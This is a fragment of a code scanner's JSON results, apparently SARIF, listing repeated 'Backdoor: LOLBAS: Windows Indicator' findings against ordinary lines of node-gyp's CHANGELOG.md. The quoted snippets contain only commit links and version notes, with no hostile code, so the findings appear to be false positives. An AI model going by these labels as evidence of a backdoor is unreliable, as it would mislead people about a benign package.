            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 477,
                  "startColumn": 83,
                  "endLine": 477,
                  "endColumn": 91,
                  "snippet": {
                    "text": "356)\n* [[`a78b584236`](https://github.com/nodejs/node-gyp/commit/a78b584236)] - **(SEMVER-MAJOR)** **gyp**: remove support for Python 2 (#2300) (Christian Clauss) [#2300](https://github.com/nodejs/node-gyp/pull/2300)\n* [[`c3c510d89e`](https://github.com/nodejs/node-gyp/commit/c3c510d89e)] - **gyp**: update gyp to v0.8.0 (#2318) (Christian Clauss) [#2318](https://github.com/nodejs/node-gyp/pull/2318)\n* [[`9e1397c52e`](https://github.com/nodejs/node-gyp/commit/9e1397c52e)] - **(SEMVER-MAJOR)** **gyp**: update gyp to v0.7.0 (#2284) (Jiawen Geng) [#2284](https://github.com/nodejs/node-gyp/pull/2284)\n* [[`",
                    "rendered": {
                      "text": "356)\n* [[`a78b584236`](https://github.com/nodejs/node-gyp/commit/a78b584236)] - **(SEMVER-MAJOR)** **gyp**: remove support for Python 2 (#2300) (Christian Clauss) [#2300](https://github.com/nodejs/node-gyp/pull/2300)\n* [[`c3c510d89e`](https://github.com/nodejs/node-gyp/commit/c3c510d89e)] - **gyp**: update gyp to v0.8.0 (#2318) (Christian Clauss) [#2318](https://github.com/nodejs/node-gyp/pull/2318)\n* [[`9e1397c52e`](https://github.com/nodejs/node-gyp/commit/9e1397c52e)] - **(SEMVER-MAJOR)** **gyp**: update gyp to v0.7.0 (#2284) (Jiawen Geng) [#2284](https://github.com/nodejs/node-gyp/pull/2284)\n* [[`",
                      "markdown": "`356)\n* [[`a78b584236`](https://github.com/nodejs/node-gyp/commit/a78b584236)] - **(SEMVER-MAJOR)** **gyp**: remove support for Python 2 (#2300) (Christian Clauss) [#2300](https://github.com/nodejs/node-gyp/pull/2300)\n* [[`c3c510d89e`](https://github.com/nodejs/node-gyp/commit/c3c510d89e)] - **gyp**: update gyp to v0.8.0 (#2318) (Christian Clauss) [#2318](https://github.com/nodejs/node-gyp/pull/2318)\n* [[`9e1397c52e`](https://github.com/nodejs/node-gyp/commit/9e1397c52e)] - **(SEMVER-MAJOR)** **gyp**: update gyp to v0.7.0 (#2284) (Jiawen Geng) [#2284](https://github.com/nodejs/node-gyp/pull/2284)\n* [[``"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 474,
                  "startColumn": 83,
                  "endLine": 474,
                  "endColumn": 91,
                  "snippet": {
                    "text": "com/nodejs/node-gyp/pull/2281)\n* [[`66c0f04467`](https://github.com/nodejs/node-gyp/commit/66c0f04467)] - **doc**: add missing `sudo` to Catalina doc (Karl Horky) [#2244](https://github.com/nodejs/node-gyp/pull/2244)\n* [[`0da2e0140d`](https://github.com/nodejs/node-gyp/commit/0da2e0140d)] - **gyp**: update gyp to v0.8.1 (#2355) (DeeDeeG) [#2355](https://github.com/nodejs/node-gyp/pull/2355)\n* [[`0093ec8646`](https://github.com/nodejs/node-gyp/commit/0093ec8646)] - **gyp**: Improve our flake8 linting tests (Christian Clauss) [#2356](https://github.com/nodejs/node-gyp/pull/2356)\n* [[`a78b584236`](https:",
                    "rendered": {
                      "text": "com/nodejs/node-gyp/pull/2281)\n* [[`66c0f04467`](https://github.com/nodejs/node-gyp/commit/66c0f04467)] - **doc**: add missing `sudo` to Catalina doc (Karl Horky) [#2244](https://github.com/nodejs/node-gyp/pull/2244)\n* [[`0da2e0140d`](https://github.com/nodejs/node-gyp/commit/0da2e0140d)] - **gyp**: update gyp to v0.8.1 (#2355) (DeeDeeG) [#2355](https://github.com/nodejs/node-gyp/pull/2355)\n* [[`0093ec8646`](https://github.com/nodejs/node-gyp/commit/0093ec8646)] - **gyp**: Improve our flake8 linting tests (Christian Clauss) [#2356](https://github.com/nodejs/node-gyp/pull/2356)\n* [[`a78b584236`](https:",
                      "markdown": "`com/nodejs/node-gyp/pull/2281)\n* [[`66c0f04467`](https://github.com/nodejs/node-gyp/commit/66c0f04467)] - **doc**: add missing `sudo` to Catalina doc (Karl Horky) [#2244](https://github.com/nodejs/node-gyp/pull/2244)\n* [[`0da2e0140d`](https://github.com/nodejs/node-gyp/commit/0da2e0140d)] - **gyp**: update gyp to v0.8.1 (#2355) (DeeDeeG) [#2355](https://github.com/nodejs/node-gyp/pull/2355)\n* [[`0093ec8646`](https://github.com/nodejs/node-gyp/commit/0093ec8646)] - **gyp**: Improve our flake8 linting tests (Christian Clauss) [#2356](https://github.com/nodejs/node-gyp/pull/2356)\n* [[`a78b584236`](https:`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 471,
                  "startColumn": 83,
                  "endLine": 471,
                  "endColumn": 91,
                  "snippet": {
                    "text": "ithub.com/nodejs/node-gyp/pull/2348)\n* [[`a5fd1f41e3`](https://github.com/nodejs/node-gyp/commit/a5fd1f41e3)] - **doc**: add downloads badge (#2352) (Jiawen Geng) [#2352](https://github.com/nodejs/node-gyp/pull/2352)\n* [[`cc1cbce056`](https://github.com/nodejs/node-gyp/commit/cc1cbce056)] - **doc**: update macOS\\_Catalina.md (#2293) (iMrLopez) [#2293](https://github.com/nodejs/node-gyp/pull/2293)\n* [[`6287118fc4`](https://github.com/nodejs/node-gyp/commit/6287118fc4)] - **doc**: updated README.md to copy easily (#2281) (மனோஜ்குமார் பழனிச்சாமி) [#2281](https://github.com/nodejs/node-gyp/pull/2281)\n* [[",
                    "rendered": {
                      "text": "ithub.com/nodejs/node-gyp/pull/2348)\n* [[`a5fd1f41e3`](https://github.com/nodejs/node-gyp/commit/a5fd1f41e3)] - **doc**: add downloads badge (#2352) (Jiawen Geng) [#2352](https://github.com/nodejs/node-gyp/pull/2352)\n* [[`cc1cbce056`](https://github.com/nodejs/node-gyp/commit/cc1cbce056)] - **doc**: update macOS\\_Catalina.md (#2293) (iMrLopez) [#2293](https://github.com/nodejs/node-gyp/pull/2293)\n* [[`6287118fc4`](https://github.com/nodejs/node-gyp/commit/6287118fc4)] - **doc**: updated README.md to copy easily (#2281) (மனோஜ்குமார் பழனிச்சாமி) [#2281](https://github.com/nodejs/node-gyp/pull/2281)\n* [[",
                      "markdown": "`ithub.com/nodejs/node-gyp/pull/2348)\n* [[`a5fd1f41e3`](https://github.com/nodejs/node-gyp/commit/a5fd1f41e3)] - **doc**: add downloads badge (#2352) (Jiawen Geng) [#2352](https://github.com/nodejs/node-gyp/pull/2352)\n* [[`cc1cbce056`](https://github.com/nodejs/node-gyp/commit/cc1cbce056)] - **doc**: update macOS\\_Catalina.md (#2293) (iMrLopez) [#2293](https://github.com/nodejs/node-gyp/pull/2293)\n* [[`6287118fc4`](https://github.com/nodejs/node-gyp/commit/6287118fc4)] - **doc**: updated README.md to copy easily (#2281) (மனோஜ்குமார் பழனிச்சாமி) [#2281](https://github.com/nodejs/node-gyp/pull/2281)\n* [[`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 467,
                  "startColumn": 82,
                  "endLine": 467,
                  "endColumn": 90,
                  "snippet": {
                    "text": "io Community page polski to auto ([#2371](https://www.github.com/nodejs/node-gyp/issues/2371)) ([1b4697a](https://www.github.com/nodejs/node-gyp/commit/1b4697abf69ef574a48faf832a7098f4c6c224a5))\n\n## v8.0.0 2021-04-03\n\n* [[`0d8a6f1b19`](https://github.com/nodejs/node-gyp/commit/0d8a6f1b19)] - **ci**: update actions/setup-node to v2 (#2302) (Sora Morimoto) [#2302](https://github.com/nodejs/node-gyp/pull/2302)\n* [[`15a5c7d45b`](https://github.com/nodejs/node-gyp/commit/15a5c7d45b)] - **ci**: migrate deprecated grammar (#2285) (Jiawen Geng) [#2285](https://github.com/nodejs/node-gyp/pull/2285)\n* [[`06ddde",
                    "rendered": {
                      "text": "io Community page polski to auto ([#2371](https://www.github.com/nodejs/node-gyp/issues/2371)) ([1b4697a](https://www.github.com/nodejs/node-gyp/commit/1b4697abf69ef574a48faf832a7098f4c6c224a5))\n\n## v8.0.0 2021-04-03\n\n* [[`0d8a6f1b19`](https://github.com/nodejs/node-gyp/commit/0d8a6f1b19)] - **ci**: update actions/setup-node to v2 (#2302) (Sora Morimoto) [#2302](https://github.com/nodejs/node-gyp/pull/2302)\n* [[`15a5c7d45b`](https://github.com/nodejs/node-gyp/commit/15a5c7d45b)] - **ci**: migrate deprecated grammar (#2285) (Jiawen Geng) [#2285](https://github.com/nodejs/node-gyp/pull/2285)\n* [[`06ddde",
                      "markdown": "`io Community page polski to auto ([#2371](https://www.github.com/nodejs/node-gyp/issues/2371)) ([1b4697a](https://www.github.com/nodejs/node-gyp/commit/1b4697abf69ef574a48faf832a7098f4c6c224a5))\n\n## v8.0.0 2021-04-03\n\n* [[`0d8a6f1b19`](https://github.com/nodejs/node-gyp/commit/0d8a6f1b19)] - **ci**: update actions/setup-node to v2 (#2302) (Sora Morimoto) [#2302](https://github.com/nodejs/node-gyp/pull/2302)\n* [[`15a5c7d45b`](https://github.com/nodejs/node-gyp/commit/15a5c7d45b)] - **ci**: migrate deprecated grammar (#2285) (Jiawen Geng) [#2285](https://github.com/nodejs/node-gyp/pull/2285)\n* [[`06ddde`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 463,
                  "startColumn": 1,
                  "endLine": 463,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\n* fix v8.0.0 release date ([4b83c3d](https://www.github.com/nodejs/node-gyp/commit/4b83c3de7300457919d53f26d96ea9ad6f6bedd8))\n* remove redundant version info ([#2403](https://www.github.com/nodejs/node-gyp/issues/2403)) ([1423670](https://www.github.com/nodejs/node-gyp/commit/14236709de64b100a424396b91a5115639daa0ef))\n* Update README.md Visual Studio Community page polski to auto ([#2371](https://www.github.com/nodejs/node-gyp/issues/2371)) ([1b4697a](https://www.github.com/nodejs/node-gyp/commit/1b4697abf69ef574a48faf832a7098f4c6c224a5))\n\n## v8.0.0 2021-04-03\n\n",
                    "rendered": {
                      "text": "\n* fix v8.0.0 release date ([4b83c3d](https://www.github.com/nodejs/node-gyp/commit/4b83c3de7300457919d53f26d96ea9ad6f6bedd8))\n* remove redundant version info ([#2403](https://www.github.com/nodejs/node-gyp/issues/2403)) ([1423670](https://www.github.com/nodejs/node-gyp/commit/14236709de64b100a424396b91a5115639daa0ef))\n* Update README.md Visual Studio Community page polski to auto ([#2371](https://www.github.com/nodejs/node-gyp/issues/2371)) ([1b4697a](https://www.github.com/nodejs/node-gyp/commit/1b4697abf69ef574a48faf832a7098f4c6c224a5))\n\n## v8.0.0 2021-04-03\n\n",
                      "markdown": "`\n* fix v8.0.0 release date ([4b83c3d](https://www.github.com/nodejs/node-gyp/commit/4b83c3de7300457919d53f26d96ea9ad6f6bedd8))\n* remove redundant version info ([#2403](https://www.github.com/nodejs/node-gyp/issues/2403)) ([1423670](https://www.github.com/nodejs/node-gyp/commit/14236709de64b100a424396b91a5115639daa0ef))\n* Update README.md Visual Studio Community page polski to auto ([#2371](https://www.github.com/nodejs/node-gyp/issues/2371)) ([1b4697a](https://www.github.com/nodejs/node-gyp/commit/1b4697abf69ef574a48faf832a7098f4c6c224a5))\n\n## v8.0.0 2021-04-03\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 445,
                  "startColumn": 10,
                  "endLine": 445,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n### Features\n\n* **gyp:** update gyp to v0.9.1 ([#2402](https://www.github.com/nodejs/node-gyp/issues/2402)) ([814b1b0](https://www.github.com/nodejs/node-gyp/commit/814b1b0eda102afb9fc87e81638a9cf5b650bb10))\n\n\n### Miscellaneous\n",
                    "rendered": {
                      "text": "\n### Features\n\n* **gyp:** update gyp to v0.9.1 ([#2402](https://www.github.com/nodejs/node-gyp/issues/2402)) ([814b1b0](https://www.github.com/nodejs/node-gyp/commit/814b1b0eda102afb9fc87e81638a9cf5b650bb10))\n\n\n### Miscellaneous\n",
                      "markdown": "`\n### Features\n\n* **gyp:** update gyp to v0.9.1 ([#2402](https://www.github.com/nodejs/node-gyp/issues/2402)) ([814b1b0](https://www.github.com/nodejs/node-gyp/commit/814b1b0eda102afb9fc87e81638a9cf5b650bb10))\n\n\n### Miscellaneous\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 333,
                  "startColumn": 12,
                  "endLine": 333,
                  "endColumn": 20,
                  "snippet": {
                    "text": "(https://www.github.com/nodejs/node-gyp/commit/5cde818aac715477e9e9747966bb6b4c4ed070a8))\n* change default gyp update message ([#2420](https://www.github.com/nodejs/node-gyp/issues/2420)) ([cfd12ff](https://www.github.com/nodejs/node-gyp/commit/cfd12ff3bb0eb4525173413ef6a94b3cd8398cad))\n* doc how to update node-gyp independently from npm ([c8c0af7](https://www.github.com/nodejs/node-gyp/commit/c8c0af72e78141a02b5da4cd4d704838333a90bd))\n* missing spaces ([f0882b1](https://www.github.com/nodejs/node-gyp/commit/f0882b1264b2fa701adbc81a3be0b3cba80e333d))\n\n\n### Core\n\n* deep-copy process.config during confi",
                    "rendered": {
                      "text": "(https://www.github.com/nodejs/node-gyp/commit/5cde818aac715477e9e9747966bb6b4c4ed070a8))\n* change default gyp update message ([#2420](https://www.github.com/nodejs/node-gyp/issues/2420)) ([cfd12ff](https://www.github.com/nodejs/node-gyp/commit/cfd12ff3bb0eb4525173413ef6a94b3cd8398cad))\n* doc how to update node-gyp independently from npm ([c8c0af7](https://www.github.com/nodejs/node-gyp/commit/c8c0af72e78141a02b5da4cd4d704838333a90bd))\n* missing spaces ([f0882b1](https://www.github.com/nodejs/node-gyp/commit/f0882b1264b2fa701adbc81a3be0b3cba80e333d))\n\n\n### Core\n\n* deep-copy process.config during confi",
                      "markdown": "`(https://www.github.com/nodejs/node-gyp/commit/5cde818aac715477e9e9747966bb6b4c4ed070a8))\n* change default gyp update message ([#2420](https://www.github.com/nodejs/node-gyp/issues/2420)) ([cfd12ff](https://www.github.com/nodejs/node-gyp/commit/cfd12ff3bb0eb4525173413ef6a94b3cd8398cad))\n* doc how to update node-gyp independently from npm ([c8c0af7](https://www.github.com/nodejs/node-gyp/commit/c8c0af72e78141a02b5da4cd4d704838333a90bd))\n* missing spaces ([f0882b1](https://www.github.com/nodejs/node-gyp/commit/f0882b1264b2fa701adbc81a3be0b3cba80e333d))\n\n\n### Core\n\n* deep-copy process.config during confi`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 332,
                  "startColumn": 20,
                  "endLine": 332,
                  "endColumn": 28,
                  "snippet": {
                    "text": " ([ed9a9ed](https://www.github.com/nodejs/node-gyp/commit/ed9a9ed653a17c84afa3c327161992d0da7d0cea))\n\n\n### Bug Fixes\n\n* add error arg back into catch block for older Node.js users ([5cde818](https://www.github.com/nodejs/node-gyp/commit/5cde818aac715477e9e9747966bb6b4c4ed070a8))\n* change default gyp update message ([#2420](https://www.github.com/nodejs/node-gyp/issues/2420)) ([cfd12ff](https://www.github.com/nodejs/node-gyp/commit/cfd12ff3bb0eb4525173413ef6a94b3cd8398cad))\n* doc how to update node-gyp independently from npm ([c8c0af7](https://www.github.com/nodejs/node-gyp/commit/c8c0af72e78141a02b5da",
                    "rendered": {
                      "text": " ([ed9a9ed](https://www.github.com/nodejs/node-gyp/commit/ed9a9ed653a17c84afa3c327161992d0da7d0cea))\n\n\n### Bug Fixes\n\n* add error arg back into catch block for older Node.js users ([5cde818](https://www.github.com/nodejs/node-gyp/commit/5cde818aac715477e9e9747966bb6b4c4ed070a8))\n* change default gyp update message ([#2420](https://www.github.com/nodejs/node-gyp/issues/2420)) ([cfd12ff](https://www.github.com/nodejs/node-gyp/commit/cfd12ff3bb0eb4525173413ef6a94b3cd8398cad))\n* doc how to update node-gyp independently from npm ([c8c0af7](https://www.github.com/nodejs/node-gyp/commit/c8c0af72e78141a02b5da",
                      "markdown": "` ([ed9a9ed](https://www.github.com/nodejs/node-gyp/commit/ed9a9ed653a17c84afa3c327161992d0da7d0cea))\n\n\n### Bug Fixes\n\n* add error arg back into catch block for older Node.js users ([5cde818](https://www.github.com/nodejs/node-gyp/commit/5cde818aac715477e9e9747966bb6b4c4ed070a8))\n* change default gyp update message ([#2420](https://www.github.com/nodejs/node-gyp/issues/2420)) ([cfd12ff](https://www.github.com/nodejs/node-gyp/commit/cfd12ff3bb0eb4525173413ef6a94b3cd8398cad))\n* doc how to update node-gyp independently from npm ([c8c0af7](https://www.github.com/nodejs/node-gyp/commit/c8c0af72e78141a02b5da`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 326,
                  "startColumn": 10,
                  "endLine": 326,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n### Features\n\n* **gyp:** update gyp to v0.9.6 ([#2481](https://www.github.com/nodejs/node-gyp/issues/2481)) ([ed9a9ed](https://www.github.com/nodejs/node-gyp/commit/ed9a9ed653a17c84afa3c327161992d0da7d0cea))\n\n\n### Bug Fixes\n",
                    "rendered": {
                      "text": "\n### Features\n\n* **gyp:** update gyp to v0.9.6 ([#2481](https://www.github.com/nodejs/node-gyp/issues/2481)) ([ed9a9ed](https://www.github.com/nodejs/node-gyp/commit/ed9a9ed653a17c84afa3c327161992d0da7d0cea))\n\n\n### Bug Fixes\n",
                      "markdown": "`\n### Features\n\n* **gyp:** update gyp to v0.9.6 ([#2481](https://www.github.com/nodejs/node-gyp/issues/2481)) ([ed9a9ed](https://www.github.com/nodejs/node-gyp/commit/ed9a9ed653a17c84afa3c327161992d0da7d0cea))\n\n\n### Bug Fixes\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 308,
                  "startColumn": 10,
                  "endLine": 308,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n### Features\n\n* **gyp:** update gyp to v0.10.0 ([#2521](https://www.github.com/nodejs/node-gyp/issues/2521)) ([5585792](https://www.github.com/nodejs/node-gyp/commit/5585792922a97f0629f143c560efd74470eae87f))\n\n\n### Tests\n",
                    "rendered": {
                      "text": "\n### Features\n\n* **gyp:** update gyp to v0.10.0 ([#2521](https://www.github.com/nodejs/node-gyp/issues/2521)) ([5585792](https://www.github.com/nodejs/node-gyp/commit/5585792922a97f0629f143c560efd74470eae87f))\n\n\n### Tests\n",
                      "markdown": "`\n### Features\n\n* **gyp:** update gyp to v0.10.0 ([#2521](https://www.github.com/nodejs/node-gyp/issues/2521)) ([5585792](https://www.github.com/nodejs/node-gyp/commit/5585792922a97f0629f143c560efd74470eae87f))\n\n\n### Tests\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 288,
                  "startColumn": 33,
                  "endLine": 288,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n### Doc\n\n* fix typo in powershell node-gyp update ([787cf7f](https://www.github.com/nodejs/node-gyp/commit/787cf7f8e5ddd5039e02b64ace6b7b15e06fe0a4))\n\n\n### Core\n",
                    "rendered": {
                      "text": "\n### Doc\n\n* fix typo in powershell node-gyp update ([787cf7f](https://www.github.com/nodejs/node-gyp/commit/787cf7f8e5ddd5039e02b64ace6b7b15e06fe0a4))\n\n\n### Core\n",
                      "markdown": "`\n### Doc\n\n* fix typo in powershell node-gyp update ([787cf7f](https://www.github.com/nodejs/node-gyp/commit/787cf7f8e5ddd5039e02b64ace6b7b15e06fe0a4))\n\n\n### Core\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 269,
                  "startColumn": 1,
                  "endLine": 269,
                  "endColumn": 9,
                  "snippet": {
                    "text": "/issues/2587)) ([a2f2988](https://www.github.com/nodejs/node-gyp/commit/a2f298870692022302fa27a1d42363c4a72df407))\n* title match content ([#2574](https://www.github.com/nodejs/node-gyp/issues/2574)) ([6e8f93b](https://www.github.com/nodejs/node-gyp/commit/6e8f93be0443f2649d4effa7bc773a9da06a33b4))\n* Update Python versions ([#2571](https://www.github.com/nodejs/node-gyp/issues/2571)) ([e069f13](https://www.github.com/nodejs/node-gyp/commit/e069f13658a8bfb5fd60f74708cf8be0856d92e3))\n\n\n### Core\n\n* add lib.target as path for searching libnode on z/OS ([1d499dd](https://www.github.com/nodejs/node-gyp/commi",
                    "rendered": {
                      "text": "/issues/2587)) ([a2f2988](https://www.github.com/nodejs/node-gyp/commit/a2f298870692022302fa27a1d42363c4a72df407))\n* title match content ([#2574](https://www.github.com/nodejs/node-gyp/issues/2574)) ([6e8f93b](https://www.github.com/nodejs/node-gyp/commit/6e8f93be0443f2649d4effa7bc773a9da06a33b4))\n* Update Python versions ([#2571](https://www.github.com/nodejs/node-gyp/issues/2571)) ([e069f13](https://www.github.com/nodejs/node-gyp/commit/e069f13658a8bfb5fd60f74708cf8be0856d92e3))\n\n\n### Core\n\n* add lib.target as path for searching libnode on z/OS ([1d499dd](https://www.github.com/nodejs/node-gyp/commi",
                      "markdown": "`/issues/2587)) ([a2f2988](https://www.github.com/nodejs/node-gyp/commit/a2f298870692022302fa27a1d42363c4a72df407))\n* title match content ([#2574](https://www.github.com/nodejs/node-gyp/issues/2574)) ([6e8f93b](https://www.github.com/nodejs/node-gyp/commit/6e8f93be0443f2649d4effa7bc773a9da06a33b4))\n* Update Python versions ([#2571](https://www.github.com/nodejs/node-gyp/issues/2571)) ([e069f13](https://www.github.com/nodejs/node-gyp/commit/e069f13658a8bfb5fd60f74708cf8be0856d92e3))\n\n\n### Core\n\n* add lib.target as path for searching libnode on z/OS ([1d499dd](https://www.github.com/nodejs/node-gyp/commi`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 266,
                  "startColumn": 12,
                  "endLine": 266,
                  "endColumn": 20,
                  "snippet": {
                    "text": "2a185056e2e589b520fbc0bcc59c2935cd07ede))\n\n\n### Doc\n\n* Add notes/disclaimers for upgrading the copy of node-gyp that npm uses ([#2585](https://www.github.com/nodejs/node-gyp/issues/2585)) ([faf6d48](https://www.github.com/nodejs/node-gyp/commit/faf6d48f8a77c08a313baf9332358c4b1231c73c))\n* Rename and update Common-issues.md --> docs/README.md ([#2567](https://www.github.com/nodejs/node-gyp/issues/2567)) ([2ef5fb8](https://www.github.com/nodejs/node-gyp/commit/2ef5fb86277c4d81baffc0b9f642a8d86be1bfa5))\n* rephrase explanation of which node-gyp is used by npm ([#2587](https://www.github.com/nodejs/node-gy",
                    "rendered": {
                      "text": "2a185056e2e589b520fbc0bcc59c2935cd07ede))\n\n\n### Doc\n\n* Add notes/disclaimers for upgrading the copy of node-gyp that npm uses ([#2585](https://www.github.com/nodejs/node-gyp/issues/2585)) ([faf6d48](https://www.github.com/nodejs/node-gyp/commit/faf6d48f8a77c08a313baf9332358c4b1231c73c))\n* Rename and update Common-issues.md --> docs/README.md ([#2567](https://www.github.com/nodejs/node-gyp/issues/2567)) ([2ef5fb8](https://www.github.com/nodejs/node-gyp/commit/2ef5fb86277c4d81baffc0b9f642a8d86be1bfa5))\n* rephrase explanation of which node-gyp is used by npm ([#2587](https://www.github.com/nodejs/node-gy",
                      "markdown": "`2a185056e2e589b520fbc0bcc59c2935cd07ede))\n\n\n### Doc\n\n* Add notes/disclaimers for upgrading the copy of node-gyp that npm uses ([#2585](https://www.github.com/nodejs/node-gyp/issues/2585)) ([faf6d48](https://www.github.com/nodejs/node-gyp/commit/faf6d48f8a77c08a313baf9332358c4b1231c73c))\n* Rename and update Common-issues.md --> docs/README.md ([#2567](https://www.github.com/nodejs/node-gyp/issues/2567)) ([2ef5fb8](https://www.github.com/nodejs/node-gyp/commit/2ef5fb86277c4d81baffc0b9f642a8d86be1bfa5))\n* rephrase explanation of which node-gyp is used by npm ([#2587](https://www.github.com/nodejs/node-gy`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 255,
                  "startColumn": 1,
                  "endLine": 255,
                  "endColumn": 9,
                  "snippet": {
